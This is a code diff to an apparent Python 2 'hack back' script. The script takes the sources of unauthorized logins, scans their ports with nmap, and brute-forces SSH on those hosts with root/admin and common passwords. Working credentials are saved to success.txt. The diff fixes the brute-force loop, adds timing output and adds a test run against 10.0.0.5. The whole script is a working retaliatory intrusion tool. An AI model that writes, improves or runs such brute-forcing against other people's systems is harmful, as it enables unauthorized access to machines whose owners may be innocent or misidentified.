@@ -71,7 +71,7 @@ def retrieve_unauthorized_origins():
     else:
         print '[!!] Locales file Missing!'
         exit()
-    print '=== FINISHED Retrieving %d Unique Unauthorized Login Sources [%ss Elapsed] ===' % \
+    print '=== FINISHED Retrieving %d Unauthorized Login Sources [%ss Elapsed] ===' % \
           (unique, str(time.time() - tic))
     return countries, counts, c_codes
 
@@ -102,8 +102,9 @@ def attempt(ip,uname,passwd):
     if connected:
         print '\033[1m[**] \033[34mSuccessfully Logged into %s@%s:%s\033[0m' % \
               (uname, ip, passwd)
-        success[ip] = [uname, passwd]
         if not os.path.isfile('success.txt'):
+            open('success.txt','w').write('=== SUCCESSFUL SSH LOGINS ===\n')
+        if os.path.isfile('success.txt'):
             win = '%s@%s : password=%s\n' % (uname, ip, passwd)
             open('success.txt', 'a').write(win)
     return connected, win
@@ -113,7 +114,8 @@ def hack_back(ip, determined):
     p = Pool(processes=1)
     success = {}
     names = ['root', 'admin']  #
-
+    start = time.time()
+    connected = False
     if determined:
         common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
         for entry in swap('common_passwords.txt', False):
@@ -124,17 +126,23 @@ def hack_back(ip, determined):
     print '... Bruteforcing %s' % ip
     for u in names:
         for pw in common:
-                # connected, credentials = attempt(ip, u, pw)
-                event = p.apply_async(func=attempt, args=(ip, u, pw))
-                connected, credentials = event.get(timeout=120)
-                if connected:
-                    break
+            # connected, credentials = attempt(ip, u, pw)
+            event = p.apply_async(func=attempt, args=(ip, u, pw))
+            connected, success = event.get(timeout=120)
+            if connected:
+                break
+        if connected:
+            break
     if not connected:
-        print '...Failed to bruteforce after %d attempts' % len(common)*len(names)
+        print '...Failed to bruteforce after %d attempts [%ss Elapsed]' %\
+              (len(common)*len(names), time.time()-start)
     return connected, success
 
 
 def attack(address, strong):
+    open_ports = []
+    success = {}
+    filtered_ports = []
     if not os.path.isfile('success.txt'):
         open('success.txt', 'w').write('=== SUCCESSFUL SSH LOGINS ===\n')
     scan = 'nmap -p T:21-25 %s >> scan.txt' % address
@@ -150,7 +158,10 @@ def attack(address, strong):
                     open_ports.append(port)
                     print '[*] %d is Open' % port
                     if port == 22:  # SSH
+                        t0 = time.time()
                         bruted, credentials = hack_back(address, strong)
+                        if bruted:
+                            print '!! Bruteforcecd in %s second' % str(time.time()-t0)
                         attacking = True
                 except IndexError:
                     pass
@@ -165,11 +176,6 @@ def attack(address, strong):
                     filtered_ports.append(port)
                     print '[*] %d is filtered' % port
                     if port == 22:  # SSH
-                        # bruted, credentials = hack_back(address, strong)
-                        # grr = p.apply_async(func=hack_back,args=(address, strong))
-                        # revenge = Thread(target=hack_back, args=(address, strong))
-                        # # revenge.setDaemon(True)
-                        # revenge.start()
                         attacking = True
                 except ValueError:
                     pass
@@ -199,9 +205,6 @@ if 'target' in sys.argv:
 
     # Scan Open Ports
     for address in targets:
-        open_ports = []
-        success = {}
-        filtered_ports = []
         try:
             attack(address, intense)
         except KeyboardInterrupt:
@@ -209,3 +212,6 @@ if 'target' in sys.argv:
 
     print 'Finished Scanning %d Hosts in %s seconds ' % (len(targets), str(time.time()-tic))
 
+
+if 'test' in sys.argv:
+    attack('10.0.0.5', True)
